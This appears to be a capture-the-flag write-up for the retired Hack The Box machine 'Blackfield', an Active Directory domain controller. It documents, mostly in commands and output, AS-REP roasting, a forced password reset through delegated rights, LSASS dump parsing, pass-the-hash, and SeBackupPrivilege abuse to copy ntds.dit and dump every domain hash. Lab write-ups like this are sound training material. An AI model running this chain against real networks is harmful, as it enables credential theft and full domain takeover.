---
machine: Blackfield
platform: Hack The Box
category: AD
os: Windows
difficulty: Hard
points: 40
tags: [as-rep-roasting, bloodhound, smb, forcechangepassword, sebackupprivilege, lsass]
date: 2026-06-01
status: retired
summary: "A hard Active Directory box exercising the full offensive AD workflow — SMB share enumeration, Kerberos pre-authentication attacks, BloodHound-driven ACL analysis, and a backup-operator privilege path to the domain's secret store. A thorough tour of chaining delegated directory permissions into domain compromise."
---
nmap scan:
```
┌──(kali㉿kali)-[~/htb/blackfield]
└─$ sudo nmap -sCV -p- 10.129.35.14 -oN nmapscan
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 19:13 -0400
Nmap scan report for 10.129.35.14
Host is up (0.034s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-19 06:15:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m49s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-19T06:15:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.90 seconds
```

Domain: `BLACKFIELD.local`

We find we have guest auth to smb and can read `profile$`, here we get a list of directories that serve as a good userlist when awk'd:

`ls -lah | awk '{print $9}' | tee userlist.txt`

We can take this list and do Unauthenticated User Spraying with Kerbrute

##### Kerbrute Unauthenticated with a Userlist
```
┌──(kali㉿kali)-[~/htb/blackfield]
└─$ kerbrute userenum --dc blackfield.local -d blackfield.local userlist.txt -v

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/18/26 - Ronnie Flathers @ropnop

2026/05/18 19:48:53 >  Using KDC(s):
2026/05/18 19:48:53 >   blackfield.local:88

2026/05/18 19:48:53 >  [!] %q - %v  Bad username: blank
2026/05/18 19:48:58 >  [!] ABenzies@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ACsonaki@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ACheretei@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] AAlleni@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] AChampken@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ABiemiller@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ABekesz@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] .@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ..@blackfield.local - User does not exist
2026/05/18 19:48:58 >  [!] ABarteski@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AHigchens@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AJaquemai@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AKollolli@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AMaceldon@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AKubale@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AKlado@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AMasalunga@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AKoffenburger@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] AKruppe@blackfield.local - User does not exist
2026/05/18 19:49:03 >  [!] ALamerz@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ANavay@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ANesterova@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] AOkleshen@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ANeusse@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] APustulka@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] AShadaia@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ASpruce@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ARotella@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ASanwardeker@blackfield.local - User does not exist
2026/05/18 19:49:08 >  [!] ASischo@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] ATaueg@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] ATwardowski@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] ATakach@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [+] VALID USERNAME:       audit2020@blackfield.local
2026/05/18 19:49:13 >  [!] AWorsey@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] AZigmunt@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] BCarmitcheal@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] AWangenheim@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] BBeloucif@blackfield.local - User does not exist
2026/05/18 19:49:13 >  [!] BBakajza@blackfield.local - User does not exist
2026/05/18 19:49:18 >  [!] BErdossy@blackfield.local - User does not exist
2026/05/18 19:49:18 >  [!] BConsultant@blackfield.local - User does not exist

```

We end up finding 3 domain joined users:
```
──(kali㉿kali)-[~/htb/blackfield/real]
└─$ cat realusers.txt 
audit2020@blackfield.local
svc_backup@blackfield.local
support@blackfield.local
```

With our wordlist we can attempt ASREPRoasting
##### ASREPRoast with Impacket GetNPUsers
```
──(kali㉿kali)-[~/htb/blackfield/real]
└─$ impacket-GetNPUsers blackfield.local/ -usersfile cutusers.txt -dc-ip 10.129.35.14 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:cc1a48a32db77f5cad4115eac2fe17cb$5e6f0aa0a4c5c95dc5a62a8d9abb3bb9ac1196e0b5c123508fedc4af982092dd424e5f54cf6d3736d6f8043adc27f24d76c74526fb851c483610e8e7e2e9db11d126d674c7f3464b0e4872ef2a093fb2a36bd3c7729de216f82cabd7f34b1a0e03e0a7557f8d71bd272d651b9873b78b468f8b7406a6abbc7a9557745e5e8dfe8a1ada75bd8a1c5d82356b66a9ad3c0466d2887063902a7ba39e28d60c5a1e4bfb37244be5471a27c83327aecf7e45fd505e59cbeeeb8b3e6a004e460262e6c65c425ddf37401b68ace8c32b7904c5a98eab30cf731a75ba39e81d511e89278b1185b831aee02d8b47553b4654d5a2d3749ba032

```

We can crack this with hashcat:
```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ hashcat crackme /usr/share/wordlists/rockyou.txt 
```

We found `support:#00^BlackKnight`, giving us our first domain user.

Of course we attempt to evil-winrm in but it fails.

When we check smb again we see that we can now read SYSVOL and NETLOGON with our new creds:
```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ nxc smb 10.129.35.14 -u 'support' -p '#00^BlackKnight' --shares
SMB         10.129.35.14    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.35.14    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.129.35.14    445    DC01             [*] Enumerated shares
SMB         10.129.35.14    445    DC01             Share           Permissions     Remark
SMB         10.129.35.14    445    DC01             -----           -----------     ------
SMB         10.129.35.14    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.35.14    445    DC01             C$                              Default share
SMB         10.129.35.14    445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.35.14    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.35.14    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.35.14    445    DC01             profiles$       READ            
SMB         10.129.35.14    445    DC01             SYSVOL          READ            Logon server share 
```

#### Downloading a Directory from SMB with spider_plus
`nxc smb 10.129.35.14 -u 'support' -p '#00^BlackKnight' -M spider_plus -o DOWNLOAD_FLAG=True` 

This downloads the share contents to `~/.nxc/modules/nxc_spider_plus/10.129.35.14`

We see this file but I'm not too concerned with potential SID perms as we should be able to just ingest into bloodhound:

```
──(kali㉿kali)-[~/…/MACHINE/Microsoft/Windows NT/SecEdit]
└─$ cat GptTmpl.inf 
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ bloodhound-python -d 'blackfield.local' -u 'support' -p '#00^BlackKnight' -ns 10.129.35.14 -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Testing resolved hostname connectivity dead:beef::3445:5a5e:df5c:f5f8
INFO: Trying LDAP connection to dead:beef::3445:5a5e:df5c:f5f8

```

Now we can ingest this into bloodhound

While I waited for it to ingest, I checked for Kerberoastable accounts, none seemed to be found:
```
──(kali㉿kali)-[~/…/MACHINE/Microsoft/Windows NT/SecEdit]
└─$ impacket-GetUserSPNs blackfield.local/support:'#00^BlackKnight' -dc-ip 10.129.35.14
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

In bloodhound we see that `SUPPORT@BLACKFIELD.LOCAL` has `ForceChangePassword` perms over `AUDIT2020@BLACKFIELD.LOCAL` meaning he can change his password and compromise him

#### Changing Password with net rpc password
```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ net rpc password Audit2020 'NewPass123!' -U 'blackfield.local/support%#00^BlackKnight' -S 10.129.35.14
```

Our new account: `audit2020:NewPass123!` has read access to the forensic share in SMB
```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ nxc smb 10.129.35.14 -u 'audit2020' -p 'NewPass123!' --shares                                         
SMB         10.129.35.14    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.35.14    445    DC01             [+] BLACKFIELD.local\audit2020:NewPass123! 
SMB         10.129.35.14    445    DC01             [*] Enumerated shares
SMB         10.129.35.14    445    DC01             Share           Permissions     Remark
SMB         10.129.35.14    445    DC01             -----           -----------     ------
SMB         10.129.35.14    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.35.14    445    DC01             C$                              Default share
SMB         10.129.35.14    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.35.14    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.35.14    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.35.14    445    DC01             profiles$       READ            
SMB         10.129.35.14    445    DC01             SYSVOL          READ            Logon server share 

```

In forensic share we can find memory_analysis which we see has an lsass.zip.  We can get this and try to dump hashes from the lsass.dmp

#### Dumping hashes from an LSASS.dmp with pypykatz
`pypykatz lsa minidump /path/to/lsass.dmp`

We get the NT hash from `svc_backup` who is an RMU member and Backup_Operator that we saw earlier.

We can pass this hash in evil-winrm to get a shell as `svc_backup` and get the user flag:

```
──(kali㉿kali)-[~/htb/blackfield/real]
└─$ cat dumpedlsasshashes.txt  
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
```

```
┌──(kali㉿kali)-[~/…/modules/nxc_spider_plus/10.129.35.14/forensic]
└─$ evil-winrm -i 10.129.35.14 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
blackfield\svc_backup
```

Upon gaining this shell we check privs:
```
*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We notice interesting privs that come from our `Backup Operators` group

```
*Evil-WinRM* PS C:\Users\svc_backup> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

The SeBackupPrivilege and SeRestorePrivilege can be used to extract SAM, SYSTEM, SECURITY, or ntds.dit files (if on a domain controller)

We are on a domain controller so I want to exploit this and dump the ntds.dit and the system in order to decrypt the credentials

I recommend this article as a guide for diskshadow and robocopy exploitation of these perms: https://juggernaut-sec.com/sebackupprivilege/

First we craft the diskshadow.txt file:

- `echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii`
- `echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append`
- `echo "create" | out-file ./diskshadow.txt -encoding ascii -append`
- `echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append`

These commands make diskshadow take a copy of C: and make it an accessible drive called Z:

Now we make our shadow copy from the diskshadow.txt file and mount it as Z:
`diskshadow.exe /s c:\temp\diskshadow.txt`

Now we need to copy `ntds.dit` and `system.bak`:
- `robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp ntds.dit` 
- `reg save hklm\system C:\Windows\Temp\system.bak`

After dumping `ntds.dit` and `system.bak` we can download it to our machine and perform a secretsdump:
`secretsdump.py -ntds ntds.dit -system system.bak LOCAL`
##### Pass the Hash for Domain Compromise
`evil-winrm -i 10.129.35.14 -u Administrator -H <admin_nt_hash>`

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/20/2026   2:32 AM             86 diskshadow.txt
-a----        5/19/2026  10:07 PM       18874368 ntds.dit
-a----        5/20/2026   2:37 AM       17580032 system.bak
```

```
┌──(kali㉿kali)-[~/htb/blackfield/real]
└─$ impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:19b2e34d7dd6c666283e93a6c3ba2ab0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```